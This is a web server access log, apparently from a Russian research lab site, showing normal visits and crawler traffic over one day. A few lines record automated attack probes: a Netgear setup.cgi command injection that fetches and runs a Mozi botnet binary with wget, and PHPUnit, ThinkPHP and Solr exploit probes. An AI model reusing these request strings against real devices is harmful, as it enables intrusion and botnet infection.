[2020-02-17 17:55:28 +0300] [31714] [INFO] Starting gunicorn 20.0.4
[2020-02-17 17:55:28 +0300] [31714] [INFO] Listening at: http://127.0.0.1:8000 (31714)
[2020-02-17 17:55:28 +0300] [31714] [INFO] Using worker: sync
[2020-02-17 17:55:28 +0300] [31717] [INFO] Booting worker with pid: 31717
[2020-02-17 17:56:19 +0300] [31714] [INFO] Handling signal: hup
[2020-02-17 17:56:19 +0300] [31714] [INFO] Hang up: Master
[2020-02-17 17:56:19 +0300] [31751] [INFO] Booting worker with pid: 31751
127.0.0.1 - - [18/Feb/2020:04:00:03 +0000] "GET / HTTP/1.0" 400 26 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
127.0.0.1 - - [18/Feb/2020:04:01:42 +0000] "POST /images.php HTTP/1.0" 301 0 "-" "curl/7.58.0"
127.0.0.1 - - [18/Feb/2020:04:19:53 +0000] "GET / HTTP/1.0" 400 26 "-" "-"
127.0.0.1 - - [18/Feb/2020:04:30:35 +0000] "GET /sequence_number/ HTTP/1.0" 200 7549 "http://ivankovlab.ru/" "Mozilla/5.0 (Linux; Android 9; Mi MIX 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36"
127.0.0.1 - - [18/Feb/2020:04:30:35 +0000] "GET /media/css/sequence_number.css HTTP/1.0" 304 0 "http://ivankovlab.ru/sequence_number/" "Mozilla/5.0 (Linux; Android 9; Mi MIX 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36"
127.0.0.1 - - [18/Feb/2020:04:30:35 +0000] "GET /media/css/style.css HTTP/1.0" 304 0 "http://ivankovlab.ru/sequence_number/" "Mozilla/5.0 (Linux; Android 9; Mi MIX 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36"
127.0.0.1 - - [18/Feb/2020:04:30:35 +0000] "GET /media/js/sequence_number.js HTTP/1.0" 304 0 "http://ivankovlab.ru/sequence_number/" "Mozilla/5.0 (Linux; Android 9; Mi MIX 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36"
127.0.0.1 - - [18/Feb/2020:04:30:35 +0000] "GET /media/js/theme-scripts.js HTTP/1.0" 304 0 "http://ivankovlab.ru/sequence_number/" "Mozilla/5.0 (Linux; Android 9; Mi MIX 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36"
127.0.0.1 - - [18/Feb/2020:04:30:35 +0000] "GET /media/js/excellentexport.min.js HTTP/1.0" 304 0 "http://ivankovlab.ru/sequence_number/" "Mozilla/5.0 (Linux; Android 9; Mi MIX 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36"
127.0.0.1 - - [18/Feb/2020:04:30:35 +0000] "GET /media/css/bootstrap.min.css HTTP/1.0" 304 0 "http://ivankovlab.ru/sequence_number/" "Mozilla/5.0 (Linux; Android 9; Mi MIX 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36"
127.0.0.1 - - [18/Feb/2020:04:30:35 +0000] "GET /media/js/bootstrap.min.js HTTP/1.0" 304 0 "http://ivankovlab.ru/sequence_number/" "Mozilla/5.0 (Linux; Android 9; Mi MIX 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36"
127.0.0.1 - - [18/Feb/2020:04:30:35 +0000] "GET /media/images/logo.png HTTP/1.0" 304 0 "http://ivankovlab.ru/sequence_number/" "Mozilla/5.0 (Linux; Android 9; Mi MIX 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36"
127.0.0.1 - - [18/Feb/2020:04:30:35 +0000] "GET /sequence_number/favicon.ico/ HTTP/1.0" 404 1688 "http://ivankovlab.ru/sequence_number/" "Mozilla/5.0 (Linux; Android 9; Mi MIX 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36"
127.0.0.1 - - [18/Feb/2020:04:30:39 +0000] "GET /sequence_number/ HTTP/1.0" 200 7549 "http://ivankovlab.ru/" "Mozilla/5.0 (Linux; Android 9; Mi MIX 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36"
127.0.0.1 - - [18/Feb/2020:04:30:39 +0000] "GET /media/css/style.css HTTP/1.0" 304 0 "http://ivankovlab.ru/sequence_number/" "Mozilla/5.0 (Linux; Android 9; Mi MIX 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36"
127.0.0.1 - - [18/Feb/2020:04:30:39 +0000] "GET /media/images/logo.png HTTP/1.0" 304 0 "http://ivankovlab.ru/sequence_number/" "Mozilla/5.0 (Linux; Android 9; Mi MIX 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36"
127.0.0.1 - - [18/Feb/2020:04:30:39 +0000] "GET /media/js/bootstrap.min.js HTTP/1.0" 304 0 "http://ivankovlab.ru/sequence_number/" "Mozilla/5.0 (Linux; Android 9; Mi MIX 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36"
127.0.0.1 - - [18/Feb/2020:04:30:39 +0000] "GET /media/js/theme-scripts.js HTTP/1.0" 304 0 "http://ivankovlab.ru/sequence_number/" "Mozilla/5.0 (Linux; Android 9; Mi MIX 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36"
127.0.0.1 - - [18/Feb/2020:04:30:39 +0000] "GET /media/css/bootstrap.min.css HTTP/1.0" 304 0 "http://ivankovlab.ru/sequence_number/" "Mozilla/5.0 (Linux; Android 9; Mi MIX 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36"
127.0.0.1 - - [18/Feb/2020:04:30:39 +0000] "GET /media/css/sequence_number.css HTTP/1.0" 304 0 "http://ivankovlab.ru/sequence_number/" "Mozilla/5.0 (Linux; Android 9; Mi MIX 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36"
127.0.0.1 - - [18/Feb/2020:04:30:39 +0000] "GET /media/js/sequence_number.js HTTP/1.0" 304 0 "http://ivankovlab.ru/sequence_number/" "Mozilla/5.0 (Linux; Android 9; Mi MIX 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36"
127.0.0.1 - - [18/Feb/2020:04:30:40 +0000] "GET /media/js/excellentexport.min.js HTTP/1.0" 304 0 "http://ivankovlab.ru/sequence_number/" "Mozilla/5.0 (Linux; Android 9; Mi MIX 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36"
127.0.0.1 - - [18/Feb/2020:04:30:42 +0000] "GET / HTTP/1.0" 200 3633 "-" "Mozilla/5.0 (Linux; Android 9; Mi MIX 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36"
127.0.0.1 - - [18/Feb/2020:04:30:43 +0000] "GET /media/js/SmoothScroll.js HTTP/1.0" 304 0 "http://ivankovlab.ru/" "Mozilla/5.0 (Linux; Android 9; Mi MIX 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36"
127.0.0.1 - - [18/Feb/2020:04:30:43 +0000] "GET /favicon.ico/ HTTP/1.0" 404 1688 "http://ivankovlab.ru/" "Mozilla/5.0 (Linux; Android 9; Mi MIX 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36"
127.0.0.1 - - [18/Feb/2020:04:55:27 +0000] "GET /robots.txt HTTP/1.0" 400 26 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
127.0.0.1 - - [18/Feb/2020:04:55:28 +0000] "GET /ads.txt HTTP/1.0" 400 26 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
127.0.0.1 - - [18/Feb/2020:05:00:07 +0000] "GET / HTTP/1.0" 200 3633 "http://89.223.29.224/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0"
127.0.0.1 - - [18/Feb/2020:05:18:24 +0000] "GET / HTTP/1.0" 400 26 "http://naoshop.ru/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36"
127.0.0.1 - - [18/Feb/2020:05:49:53 +0000] "GET /robots.txt HTTP/1.0" 400 26 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
127.0.0.1 - - [18/Feb/2020:05:49:56 +0000] "GET / HTTP/1.0" 400 26 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
127.0.0.1 - - [18/Feb/2020:06:09:12 +0000] "GET /robots.txt HTTP/1.0" 400 26 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
127.0.0.1 - - [18/Feb/2020:06:11:14 +0000] "GET /griby/syroezhki HTTP/1.0" 400 26 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
127.0.0.1 - - [18/Feb/2020:06:25:33 +0000] "GET / HTTP/1.0" 200 3633 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
127.0.0.1 - - [18/Feb/2020:06:38:39 +0000] "GET / HTTP/1.0" 400 26 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
127.0.0.1 - - [18/Feb/2020:06:38:44 +0000] "GET / HTTP/1.0" 200 3633 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [18/Feb/2020:06:38:44 +0000] "GET / HTTP/1.0" 200 3633 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [18/Feb/2020:06:38:44 +0000] "GET /media/css/bootstrap.min.css HTTP/1.0" 200 0 "http://ivankovlab.ru/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [18/Feb/2020:06:38:44 +0000] "GET /media/css/style.css HTTP/1.0" 304 0 "http://ivankovlab.ru/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [18/Feb/2020:06:38:44 +0000] "GET /favicon.ico/ HTTP/1.0" 404 1688 "http://ivankovlab.ru/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [18/Feb/2020:06:38:47 +0000] "GET /sequence_number/ HTTP/1.0" 200 7549 "http://ivankovlab.ru/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [18/Feb/2020:06:38:47 +0000] "GET /media/css/sequence_number.css HTTP/1.0" 304 0 "http://ivankovlab.ru/sequence_number/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [18/Feb/2020:06:38:47 +0000] "GET /media/js/sequence_number.js HTTP/1.0" 304 0 "http://ivankovlab.ru/sequence_number/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [18/Feb/2020:06:38:47 +0000] "GET /media/js/excellentexport.min.js HTTP/1.0" 304 0 "http://ivankovlab.ru/sequence_number/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [18/Feb/2020:06:38:47 +0000] "GET /sequence_number/favicon.ico/ HTTP/1.0" 404 1688 "http://ivankovlab.ru/sequence_number/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [18/Feb/2020:06:39:01 +0000] "POST /sequence_number/calc/ HTTP/1.0" 200 8229 "http://ivankovlab.ru/sequence_number/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [18/Feb/2020:06:42:16 +0000] "GET / HTTP/1.0" 200 3633 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
127.0.0.1 - - [18/Feb/2020:06:42:16 +0000] "GET /favicon.ico HTTP/1.0" 301 0 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
127.0.0.1 - - [18/Feb/2020:06:42:16 +0000] "GET /favicon.ico/ HTTP/1.0" 404 1688 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
127.0.0.1 - - [18/Feb/2020:06:44:08 +0000] "GET / HTTP/1.0" 400 26 "-" "-"
127.0.0.1 - - [18/Feb/2020:06:52:04 +0000] "GET / HTTP/1.0" 400 26 "http://link.2gis.ru/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36"
127.0.0.1 - - [18/Feb/2020:06:52:05 +0000] "GET /favicon.ico HTTP/1.0" 400 26 "http://naoshop.ru/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36"
127.0.0.1 - - [18/Feb/2020:06:57:32 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 400 26 "-" "-"
127.0.0.1 - - [18/Feb/2020:07:22:02 +0000] "GET / HTTP/1.0" 200 3633 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
127.0.0.1 - - [18/Feb/2020:07:41:07 +0000] "GET / HTTP/1.0" 200 3633 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
127.0.0.1 - - [18/Feb/2020:07:57:46 +0000] "GET / HTTP/1.0" 200 3633 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [18/Feb/2020:07:57:47 +0000] "GET / HTTP/1.0" 200 3633 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [18/Feb/2020:07:57:47 +0000] "GET /favicon.ico/ HTTP/1.0" 404 1688 "http://ivankovlab.ru/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [18/Feb/2020:07:57:49 +0000] "GET /sequence_number/ HTTP/1.0" 200 7549 "http://ivankovlab.ru/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [18/Feb/2020:07:57:49 +0000] "GET /sequence_number/favicon.ico/ HTTP/1.0" 404 1688 "http://ivankovlab.ru/sequence_number/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [18/Feb/2020:07:58:01 +0000] "POST /sequence_number/calc/ HTTP/1.0" 200 6393 "http://ivankovlab.ru/sequence_number/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [18/Feb/2020:07:58:13 +0000] "GET / HTTP/1.0" 200 3633 "http://ivankovlab.ru/sequence_number/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [18/Feb/2020:07:58:13 +0000] "GET /media/css/style.css HTTP/1.0" 200 0 "http://ivankovlab.ru/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [18/Feb/2020:07:58:13 +0000] "GET /media/js/SmoothScroll.js HTTP/1.0" 200 0 "http://ivankovlab.ru/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [18/Feb/2020:07:59:05 +0000] "GET / HTTP/1.0" 400 26 "http://naoshop.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.84 Safari/537.36"
127.0.0.1 - - [18/Feb/2020:08:06:52 +0000] "GET / HTTP/1.0" 400 26 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36"
127.0.0.1 - - [18/Feb/2020:08:12:16 +0000] "GET / HTTP/1.0" 400 26 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
127.0.0.1 - - [18/Feb/2020:08:19:15 +0000] "GET / HTTP/1.0" 400 26 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
127.0.0.1 - - [18/Feb/2020:08:38:46 +0000] "GET /robots.txt HTTP/1.0" 400 26 "-" "Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/2.0; +http://go.mail.ru/help/robots)"
127.0.0.1 - - [18/Feb/2020:08:38:48 +0000] "GET /chay/chernyy-chay-menu-tee-100-paketikov HTTP/1.0" 400 26 "-" "Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/2.0; +http://go.mail.ru/help/robots)"
127.0.0.1 - - [18/Feb/2020:08:38:50 +0000] "GET /chay/zelenyy-chay-s-moroshkoy-victorian-green-tea-cloudberry-100-paketikov HTTP/1.0" 400 26 "-" "Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/2.0; +http://go.mail.ru/help/robots)"
127.0.0.1 - - [18/Feb/2020:08:48:47 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [18/Feb/2020:08:48:48 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php/ HTTP/1.0" 404 1688 "http://89.223.29.224:80/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [18/Feb/2020:09:33:55 +0000] "GET /solr/admin/info/system?wt=json HTTP/1.0" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [18/Feb/2020:09:33:59 +0000] "GET /solr/admin/info/system/?wt=json HTTP/1.0" 404 1688 "http://89.223.29.224:80/solr/admin/info/system?wt=json" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [18/Feb/2020:09:51:47 +0000] "HEAD /robots.txt HTTP/1.0" 400 26 "-" "-"
127.0.0.1 - - [18/Feb/2020:10:00:32 +0000] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.0" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [18/Feb/2020:10:00:35 +0000] "GET /index.php/?s=/Index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.0" 404 1688 "http://89.223.29.224:80/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [18/Feb/2020:10:38:20 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0" 200 3633 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [18/Feb/2020:10:46:32 +0000] "GET /robots.txt HTTP/1.0" 400 26 "-" "Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/2.0; +http://go.mail.ru/help/robots)"
127.0.0.1 - - [18/Feb/2020:10:46:34 +0000] "GET / HTTP/1.0" 400 26 "-" "Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/2.0; +http://go.mail.ru/help/robots)"
127.0.0.1 - - [18/Feb/2020:10:48:10 +0000] "GET / HTTP/1.0" 400 26 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36"
127.0.0.1 - - [18/Feb/2020:10:56:36 +0000] "GET / HTTP/1.0" 200 3633 "http://ivankovlab.ru/sequence_number/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [18/Feb/2020:10:56:36 +0000] "GET /media/css/style.css HTTP/1.0" 200 0 "http://ivankovlab.ru/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [18/Feb/2020:10:56:36 +0000] "GET /media/js/SmoothScroll.js HTTP/1.0" 200 0 "http://ivankovlab.ru/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [18/Feb/2020:10:56:36 +0000] "GET /favicon.ico HTTP/1.0" 301 0 "http://ivankovlab.ru/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [18/Feb/2020:10:56:36 +0000] "GET /favicon.ico/ HTTP/1.0" 404 1688 "http://ivankovlab.ru/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [18/Feb/2020:10:56:37 +0000] "GET / HTTP/1.0" 200 3633 "http://ivankovlab.ru/sequence_number/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [18/Feb/2020:10:56:37 +0000] "GET /media/css/bootstrap.min.css HTTP/1.0" 200 0 "http://ivankovlab.ru/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [18/Feb/2020:10:56:37 +0000] "GET /media/css/style.css HTTP/1.0" 200 0 "http://ivankovlab.ru/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [18/Feb/2020:10:56:38 +0000] "GET /sequence_number/ HTTP/1.0" 200 7549 "http://ivankovlab.ru/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [18/Feb/2020:10:56:38 +0000] "GET /media/css/sequence_number.css HTTP/1.0" 304 0 "http://ivankovlab.ru/sequence_number/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [18/Feb/2020:10:56:38 +0000] "GET /media/js/sequence_number.js HTTP/1.0" 304 0 "http://ivankovlab.ru/sequence_number/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [18/Feb/2020:10:56:39 +0000] "GET /sequence_number/favicon.ico/ HTTP/1.0" 404 1688 "http://ivankovlab.ru/sequence_number/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [18/Feb/2020:10:56:42 +0000] "GET / HTTP/1.0" 200 3633 "http://ivankovlab.ru/sequence_number/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [18/Feb/2020:10:56:42 +0000] "GET /media/js/SmoothScroll.js HTTP/1.0" 200 0 "http://ivankovlab.ru/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
127.0.0.1 - - [18/Feb/2020:10:59:23 +0000] "GET / HTTP/1.0" 200 3633 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36"
127.0.0.1 - - [18/Feb/2020:11:05:29 +0000] "GET /robots.txt HTTP/1.0" 400 26 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
127.0.0.1 - - [18/Feb/2020:11:05:32 +0000] "GET / HTTP/1.0" 400 26 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
